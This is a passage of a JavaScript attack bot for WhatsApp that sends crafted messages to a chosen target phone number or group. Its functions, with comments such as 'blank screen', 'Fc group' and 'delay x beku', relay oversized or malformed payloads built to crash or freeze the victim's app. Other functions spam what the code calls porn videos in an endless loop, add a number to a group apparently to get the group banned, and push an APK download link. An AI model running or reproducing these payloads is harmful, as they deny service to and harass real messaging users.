                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: null,
                            caption: "moro",
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [
                                999999999999999998999,
                                999999999999999899999,
                                999999999999999989999,
                                999999999999999998999
                            ],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: {
                        text: "moro"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 750000 }, () => ({}))
                    }
                }
            }
        }
    };

    const mmklu = generateWAMessageFromContent(target, bpklo, {});

    await sock.relayMessage(target, mmklu.message, {
        participant: target,
        messageId: mmklu.key.id
    });
}
//blank screen
async function BlankScreenV1(sock, target) {
    const LexzyExe = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "moro"
                    },
                    nativeFlowMessage: {
                        buttons: "{}".repeat(75000),
                    },
                },
            },
        },
    };

    const Lexx = generateWAMessageFromContent(target, LexzyExe, {});

    await sock.relayMessage(target, Lexx.message, {
        participant: target,
        messageId: Lexx.key.id
    });

    await sock.relayMessage(target, {
        stickerPackMessage: {
            stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
            name: "ꦾ".repeat(75000),
            publisher: "moro" + "ꦾ".repeat(5000),
            stickers: [],
            fileLength: "366299919",
            fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
            fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
            mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
            directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
            contextInfo: {
                remoteJid: "X",
                participant: "0@s.whatsapp.net",
                stanzaId: "1234567890ABCDEF",
                mentionedJid: ["13135555555@s.whatsapp.net"]
            },
            packDescription: "",
            mediaKeyTimestamp: "1747502082",
            trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
            thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
            thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
            thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
            thumbnailHeight: 999999999,
            thumbnailWidth: 9999999999,
            imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
            stickerPackSize: "9990099",
            stickerPackOrigin: "USER_CREATED"
        }
    }, {});

    await sock.relayMessage(
        target,
        {
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "moro",
                            locationMessage: {
                                degreesLatitude: -999.03499999999999,
                                degreesLongitude: 922.9999999999999,
                                name: "LexzyMods",
                                address: "X",
                                jpegThumbnail: null,
                            },
                            hasMediaAttachment: true,
                        },
                        body: {
                            text: "moro",
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: "ြ ".repeat(9000),
                                },
                                {
                                    name: "address_message",
                                    buttonParamsJson: "ြ ".repeat(9000),
                                },
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: "ြ ".repeat(75000),
                                },
                            ],
                            messageParamsJson: "wa.me/stickerpack/LexzyMods",
                            messageVersion: 1,
                        },
                    },
                },
            },
        },
        {}
    );

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    caption: "moro",
                    fileSha256: "LdNOQNcNIvlIijHvkpwRIY/zIoTfWQoFux7dzTHusyM=",
                    fileLength: "1099511627776",
                    seconds: 172800,
                    mediaKey: "G2MGbP7BZLi1RwpyyV4DeXtfttaclMVSKfqNldZDt20=",
                    height: 1080,
                    width: 1920,
                    fileEncSha256: "U4uKZrZeJpg8smAcMRT3qtPoviAp/dqGa63GzqYcS8E=",
                    directPath: "/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1774428565",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIEQQIgQVFT/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6Zz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABESACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z",
                    annotations: [
                        {
                            polygonVertices: [
                                {
                                    x: 0.17499999701976776,
                                    y: 0.3379453122615814
                                },
                                {
                                    x: 0.824999988079071,
                                    y: 0.3379453122615814
                                },
                                {
                                    x: 0.824999988079071,
                                    y: 0.6620468497276306
                                },
                                {
                                    x: 0.17499999701976776,
                                    y: 0.6620468497276306
                                }
                            ],
                            shouldSkipConfirmation: true,
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "2261401457948346",
                                    songId: "849859527815275",
                                    author: "moro" + "ြ".repeat(9000),
                                    title: "ြ".repeat(75000),
                                    artworkDirectPath: "/v/t62.76458-24/568311115_4528169627440664_4559757974106869948_n.enc?ccb=11-4&oh=01_Q5Aa5AGs28VMFVXkcn0w9n-YUhiBwEPKyIwEcjWZLHm7mUgOsQ&oe=6A786B6E&_nc_sid=5e03e0",
                                    artworkSha256: "FROyKnRoHfLzDwmz5tED8K3nmdK+4Uihn2ucHBZDjPI=",
                                    artworkEncSha256: "y/SkheY3BoGhndQlmR6icfLtMtI4FjjRi5y3bsX13jw=",
                                    artworkMediaKey: "s5VCH/gb/YjDXhek47MVcsHjVV3/lOHOYaDe72eodXw=",
                                    artistAttribution: "https://www.instagram.com/_u/lexzymods",
                                    countryBlocklist: "WEs=",
                                    isExplicit: false
                                }
                            },
                            embeddedAction: true
                        }
                    ]
                }
            }
        }
    }, {});

    const bot = "867051314767696@bot";

    await sock.relayMessage(target, {
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,

                    submessages: [
                        {
                            messageType: 2,
                            messageText: `@${bot.split("@")[0]}`
                        },

                        {
                            messageType: 5,
                            codeMetadata: {
                                codeLanguage: "javascript",

                                codeBlocks: [
                                    {
                                        highlightType: 1,
                                        codeContent: "const = {"
                                    },
                                    {
                                        highlightType: 2,
                                        codeContent: "moro"
                                    },
                                    {
                                        highlightType: 3,
                                        codeContent: `${"\0".repeat(75000)}` + `${"\x10".repeat(25000)}`
                                    }
                                ]
                            }
                        }
                    ],

                    contextInfo: {
                        mentionedJid: [bot],

                        featureEligibilities: Array.from(
                            { length: 1999 },
                            () => ({
                                canReceiveMultiReact: true
                            })
                        ),

                        isForwarded: true,

                        forwardedAiBotMessageInfo: {
                            botJid: bot
                        },

                        forwardOrigin: 4
                    }
                }
            }
        }
    }, {});

    const Iniochamy = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 9999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: null,
                            caption: "moro",
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [
                                9999987899999999999999,
                                998999999999999999999,
                                999899999999999999999,
                                9998789999999999999999
                            ],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: {
                        text: "moro",
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 450000 }, () => ({}))
                    }
                }
            }
        }
    };

    const Iniochamyy = generateWAMessageFromContent(target, Iniochamy, {});

    await sock.relayMessage(target, Iniochamyy.message, {
        participant: target,
        messageId: Iniochamyy.key.id
    });

    const LexMsg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 9999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: null,
                            caption: "moro",
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [
                                9999999999999999999,
                                9999999999999999999,
                                9999999999999999999,
                                9999999999999999999
                            ],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: {
                        text: "moro"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    const Lexca = generateWAMessageFromContent(target, LexMsg, {});

    await sock.relayMessage(target, Lexca.message, {
        participant: target,
        messageId: Lexca.key.id
    });

    const Lexcaa = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "moro"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    const Lexcaabos = generateWAMessageFromContent(target, Lexcaa, {});

    await sock.relayMessage(target, Lexcaabos.message, {
        participant: target,
        messageId: Lexcaabos.key.id
    });

    const msg = {
        key: { remoteJid: "status@broadcast", fromMe: true, id: generateId() },
        message: {
            imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                caption: "moro",
                fileSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
                fileLength: 9999999,
                height: 9999,
                width: 9999,
                mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                fileEncSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
                directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1776937541",
                jpegThumbnail: largeThumbnail,
                scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
                scanLengths: [
                    9899999999999999077,
                    8899999999999998555,
                    9699999999999999148,
                    1069999999999999164
                ],
                midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk=",
                contextInfo: {
                    pairedMediaType: "NOT_PAIRED_MEDIA",
                    isQuestion: true,
                    isGroupStatus: true,
                    remoteJid: "status@broadcast",
                    entryPointConversionDelaySeconds: 999999,
                    entryPointConversionSource: "booking_status"
                }
            }
        }
    };

    await sock.relayMessage("status@broadcast", msg.message, {
        statusJidList: [target],
        messageId: msg.key.id,
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                }]
            }]
        }]
    });

    await sock.relayMessage(target, {
        statusMentionMessage: {
            message: {
                protocolMessage: {
                    key: msg.key,
                    type: 25
                },
                additionalNodes: [{
                    tag: "meta",
                    attrs: { is_status_mention: "false" },
                    content: undefined
                }]
            }
        }
    }, {});

    await sock.relayMessage(target, {
        statusMentionMessage: {
            message: {
                protocolMessage: {
                    key: msg.key,
                    type: 25
                }
            }
        }
    }, {});
}
//buldo
async function topsbuldog(sock, target) {
  try {
    const msg = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: "\u0796"
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_download",
                  buttonParamsJson: JSON.stringify({
                    display_text: "bulldozer",
                    url: "https://files.catbox.moe/4zb6zz.apk".repeat(20000),
                    filename: "catbox.apk"
                  })
                }
              ]
            },
            nativeFlowResponMessage: {
              buttons: Array.from({ length: 500000 }, () => ({}))
            }
          }
        }
      }
    };

    await sock.relayMessage(target, msg, {});
    return { success: true };

  } catch (error) {
    console.log("ERROR:", error.message);
    return { success: false, error: error.message };
  }
}
//spam bokep
async function Slayerspmvideo(sock, target) {
    const videoUrls = [
        'https://files.catbox.moe/eiqyw2.mp4',
        'https://files.catbox.moe/eiqyw2.mp4',
        'https://files.catbox.moe/eiqyw2.mp4',
        'https://files.catbox.moe/eiqyw2.mp4',
        'https://files.catbox.moe/eiqyw2.mp4'
    ];

    const captions = [  
        '🔥 Angee kamu kan?!',
        '🎬 Video spesial buat kamu!'
    ];

    while (true) {
        const randomVideo = videoUrls[Math.floor(Math.random() * videoUrls.length)];
        const randomCaption = captions[Math.floor(Math.random() * captions.length)];
        
        await sock.sendMessage(target, {
            video: { url: randomVideo },
            mimetype: 'video/mp4',
            caption: randomCaption
        });
    }
}
//ban gb
async function BanGroupNew(sock, groupJid) {
  if (!groupJid.endsWith('@g.us')) {
    throw new Error('@g.us server required');
  }

  let group = groupJid;

  try {
    await sock.groupParticipantsUpdate(
      group,
      ['18188880008@s.whatsapp.net'],
      'add',
    );

    await sock.sendPresenceUpdate('composing', group);
  } catch (err) {
    console.error('error:', err);
    throw err;
  }
}
//Fc group
async function BlankMaklo(sock, groupJid) {
    await sock.relayMessage(groupJid, {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\x10' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u2065'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"bank_transfer","bank_transfer":{"merchant_name":"\x10","key":"' + '\u0003'.repeat(9000) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    }, {});
}

//FUNCTION BEBAS SPAMM
//fc 
async function ForcloseNewXka(sock, target) {
const IMG = {
url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
fileLength: 20010,
mediaKeyTimestamp: "1785637793",
mimetype: "image/jpeg",
height: 1600,
width: 1200,
jpegThumbnail: ""
};

const TAGS = [
[0xBA, 0x03],
[0xD2, 0x04],
[0xAA, 0x02],
];

const encodeVarint = function(n) {
var buf = [];
while (n >= 0x80) {
buf.push((n & 0x7f) | 0x80);
n >>>= 7;
}
buf.push(n);
return Buffer.from(buf);
};

const wrapLd = function(tag, data) {
return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
};

const basePayload = proto.Message.encode(
proto.Message.fromObject({ imageMessage: IMG })
).finish();

const inflate = function(tag, depth) {
var buf = basePayload;
for (var i = 0; i < depth; i++) {
buf = wrapLd(tag, wrapLd([0x0A], buf));
}
return buf;
};

const resolveJid = function(raw) {
var s = String(raw || '').trim();
if (s.includes('@')) return s;
return s.replace(/\D/g, '') + '@s.whatsapp.net';
};

const jids = (Array.isArray(target) ? target : [target])
.map(resolveJid)
.filter(function(j) { return j.length > 15; });

if (!jids.length) return;

var MAX_BATCH = 5;
var totalSent = 0;

for (var i = 0; i < 900; i++) {
for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
var chunk = jids.slice(offset, offset + MAX_BATCH);

for (var ti = 0; ti < TAGS.length; ti++) {
var tag = TAGS[ti];
var payload = null;

for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
try {
var decoded = proto.Message.decode(inflate(tag, depth));
proto.Message.encode(decoded).finish();
payload = decoded;
} catch (_) {}
}

if (!payload) continue;

var msgId = 'moro' + Date.now().toString(36).toUpperCase() + '_' + i + '_' + offset;

try {
await depayy.relayMessage('status@broadcast', payload, {
messageId: msgId,
statusJidList: chunk,
additionalNodes: [{
tag: 'meta',
attrs: {},
content: [{
tag: 'mentioned_users',
attrs: {},
content: chunk.map(function(jid) {
return { tag: 'to', attrs: { jid: jid }, content: [] };
})
}]
}]
});
totalSent++;
console.log(`✅ Moro Model Brutal To ${target} (${totalSent} total)`);
} catch (_) {}

await new Promise(function(r) { setTimeout(r, 1000); });
}
}
}
}
//delay 
async function maklu(sock, target) {
  const simple = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "moro"
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "galaxy_message",
                buttonParamsJson: "{}" + "\0".repeat(35000)
              }
            ]
          }
        }
      }
    }
  };

  await sock.relayMessage(target, simple, {});
  participant: true 
}
//delay x beku
async function DelayXFrezee(sock, target) {
  const yamete = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
        body: {
          text: "moro"
        },
        nativeFlowMessage: {
       buttons: Array.from({ length: 500000 }, () => ({}))
          }
         }
       }
     }
    };

   await sock.relayMessage(target, yamete, {
       additionalNodes: [{
           tag: "biz",
           attrs: {}
       }]
   });
}
//
bot.launch();